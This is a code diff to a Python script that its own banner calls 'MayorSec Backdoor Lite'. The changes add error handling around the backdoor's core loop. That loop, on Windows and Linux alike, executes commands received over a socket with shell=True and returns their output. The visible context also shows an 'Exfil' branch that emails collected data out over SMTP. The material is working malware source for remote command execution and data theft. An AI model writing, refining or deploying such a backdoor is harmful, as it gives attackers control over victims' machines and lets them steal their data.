@@ -16,7 +16,7 @@ banner = (b"""
 ================================================
                MayorSec Backdoor
                      Lite               
-                     v1.1               
+                     v1.0               
 ================================================
 """)
 time.sleep(1)
@@ -70,11 +70,14 @@ def main():
                             session.sendmail(sender_address, receiver_address, text)
                             session.quit()
                             self.csocket.send(bytes(b"Exfil complete.\n"))        
-                        else:    
-                            command = data
-                            p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
-                            output = p.stdout.read()
-                            self.csocket.send(bytes(output))
+                        else:
+                            try:    
+                                command = data
+                                p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
+                                output = p.stdout.read()
+                                self.csocket.send(bytes(output))
+                            except ConnectionAbortedError:
+                                quit()
                     elif sys.platform.startswith('linux'):
                         curDir = os.getcwd()
                         curUser = os.getlogin()
@@ -111,11 +114,14 @@ def main():
                             session.sendmail(sender_address, receiver_address, text)
                             session.quit()
                             self.csocket.send(bytes(b"Exfil complete.\n"))                          
-                        else:    
-                            command = data
-                            p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
-                            output = p.stdout.read()
-                            self.csocket.send(bytes(output))                                
+                        else:
+                            try:    
+                                command = data
+                                p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
+                                output = p.stdout.read()
+                                self.csocket.send(bytes(output))        
+                            except BrokenPipeError:
+                                quit()                        
 
     while True:
         a.listen(1000)
